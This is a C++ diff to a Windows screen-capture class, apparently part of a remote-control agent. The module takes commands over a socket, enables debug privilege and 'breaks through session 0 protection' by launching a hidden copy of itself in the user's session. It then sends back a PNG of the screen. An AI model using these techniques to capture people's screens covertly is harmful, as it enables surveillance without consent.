@@ -22,8 +22,9 @@
 * 参数 dirPath    截图存放目录
 * 参数 filename 截图名称
 */
-int CCaptureScreen::CaptureScreenImage(HWND hwnd,DWORD& captureId)
+DWORD CCaptureScreen::CaptureScreenImage(HWND hwnd)
 {
+	DWORD retFileId = 0;
 	HANDLE hDIB;
 	DWORD dwBmpSize;
 	DWORD dwSizeofDIB;
@@ -100,10 +101,10 @@ int CCaptureScreen::CaptureScreenImage(HWND hwnd,DWORD& captureId)
 		DIB_RGB_COLORS // 颜色表由红、绿、蓝（RGB）三个直接值构成
 		);
 
-	captureId = GetTickCount();
+	retFileId = GetTickCount();
 	WCHAR szCaptureFilePath[MAX_PATH] = { 0 };
-	swprintf_s(szCaptureFilePath, L"%s%d.png", Util::help::GetProgramRunDir().c_str(), captureId);
-	DebugOutputMsg(_T("catpture path[%s]"), szCaptureFilePath);
+	swprintf_s(szCaptureFilePath, L"%s%d.png", Util::help::GetProgramRunDir().c_str(), retFileId);
+	DebugOutputMsg(_T("catpture path[%s], dwFileID=[%d]"), szCaptureFilePath, retFileId);
 
 	// 将 图片头(headers)的大小, 加上位图的大小来获得整个文件的大小
 	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);
@@ -141,7 +142,7 @@ done:
 	DeleteObject(hdcMemDC);
 	ReleaseDC(NULL, hdcScreen);
 
-	return 0;
+	return retFileId;
 }
 
 //根据不同的消息类型，执行不同的
@@ -194,23 +195,28 @@ void CCaptureScreen::controlExec(precvmessage precv, SOCKET socket)
 			  GetModuleFileName(hmoudle, filename, MAX_PATH);
 
 			  Utilities::CeOSVer osv;
-			  //if (!osv.IsVistaOrLater())
-			  //{
-				 // // NT系列需要提升权限
-				 // Singleton<CWinPrivilege>::instance()->EnableSeviceDebugPrivilege();
-			  //}
+			  if (!osv.IsVistaOrLater())
+			  {
+				 // NT系列需要提升权限
+				 Singleton<CWinPrivilege>::instance()->EnableSeviceDebugPrivilege();
+			  }
+
+			  TCHAR szCmd[MAX_PATH] = { 0 };
+			  swprintf_s(szCmd, L" -%s", CMDLINE_PARAM_NAME_CAPTURE);
 			  //突破session0保护
-			  DWORD dwCaptureID = CreateUserProcess(filename, CMDLINE_PARAM_NAME_CAPTURE);
+			  DWORD dwCaptureID = CreateUserProcess(filename, szCmd);
 			  //if (dwCaptureID == 0)
 			  {
-				  DebugOutputMsg(_T("filename is [%s]"), filename);
-				  Singleton<CWinPrivilege>::instance()->ExecuteW(filename, CMDLINE_PARAM_NAME_CAPTURE, NULL, true, true);
-
-				  Singleton<CWinPrivilege>::instance()->LaunchAppAsAdminUser(filename, CMDLINE_PARAM_NAME_CAPTURE, false);
-				  return;
+				  DebugOutputMsg(_T("filename is [%s],szcmd=[%s],dwCaptureID=[%d]"), filename, szCmd, dwCaptureID);
+				  //Singleton<CWinPrivilege>::instance()->ExecuteW(filename, szCmd, NULL, true, true);
+				 // DebugOutputMsg(_T("is sleeping.."));
+				  //Sleep(5000);
+				  Singleton<CWinPrivilege>::instance()->LaunchAppAsAdminUser(filename, szCmd, dwCaptureID,true);
+				  DebugOutputMsg(_T("LaunchAppAsAdminUser dwCaptureID=[%d]"), dwCaptureID);
+				  //return;
 			  }
 			  //等待图片创建完成
-			  Sleep(1000);
+			  //Sleep(2000);
 			  sendmsg.type = 2;
 			  memcpy(sendmsg.data, "Screenshoot png", strlen("Screenshoot png") + 1);
 			  //先发送过去，进入，循环接收
@@ -357,7 +363,7 @@ DWORD CCaptureScreen::CreateUserProcess(WCHAR* lpszFileName, WCHAR* cmd)
 		}
 		// 在复制的用户Session下执行应用程序，创建进程
 		if (FALSE == ::CreateProcessAsUser(hDuplicatedToken,
-			lpszFileName, CMDLINE_PARAM_NAME_CAPTURE, NULL, NULL, FALSE,
+			lpszFileName, cmd, NULL, NULL, FALSE,
 			NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
 			lpEnvironment, NULL, &si, &pi))
 		{
@@ -365,7 +371,9 @@ DWORD CCaptureScreen::CreateUserProcess(WCHAR* lpszFileName, WCHAR* cmd)
 			DebugOutputMsg(_T("CreateProcessAsUser failed, filename=[%s], cmd=[%s],lastError=[%d]"), lpszFileName,cmd,GetLastError());
 			break;
 		}
+		WaitForSingleObject(pi.hProcess, INFINITE);
 		GetExitCodeProcess(pi.hProcess, &returnCode);
+		DebugOutputMsg(_T("CreateUserProcess returnCode=%d"), returnCode);
 	} while (FALSE);
 	// 关闭句柄, 释放资源
 	if (lpEnvironment)
